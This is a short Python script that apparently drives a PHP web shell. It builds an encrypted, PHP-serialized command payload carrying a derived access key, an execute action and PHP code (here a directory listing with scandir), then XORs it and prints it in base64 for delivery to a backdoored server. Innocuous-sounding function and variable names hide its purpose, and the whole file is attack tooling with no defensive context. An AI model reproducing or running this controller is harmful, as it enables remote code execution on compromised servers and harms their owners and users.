#!/bin/env python3

import base64

import phpserialize

improve_meta = base64.b64decode("UAMQV1oLEgBLUAsHE11SXwAPSlNVVA5CUwELU11GRlgBWFIH")
x1 = b"dfvaijpefajewpfja9gjdgjoegijdpsodjfe"
key = b'abc'

def strxor(s, key):
	b = bytearray(s)
	bkey = bytearray(key)

	for i in range(len(s)):
		b[i] ^= bkey[i % len(key)]

	return bytes(b)

def screen_submission(sub_key, sub_meta):
	sub = strxor(sub_key, strxor(improve_meta, x1))

	return strxor(sub, sub_meta)

def remove_letter(data, key):
	return phpserialize.loads(screen_submission(data, key))

target_payload = {
	'ak': strxor(improve_meta, x1),
	'a': 'e',
	'd': "echo implode(', ', scandir('.'));"
}

target_ser = phpserialize.dumps(target_payload)
target_enc1 = strxor(target_ser, key)
target_enc2 = strxor(target_enc1, strxor(improve_meta, x1))

target_enc2_b64 = base64.b64encode(target_enc2)
print(target_enc2_b64.decode("utf-8"), end="")
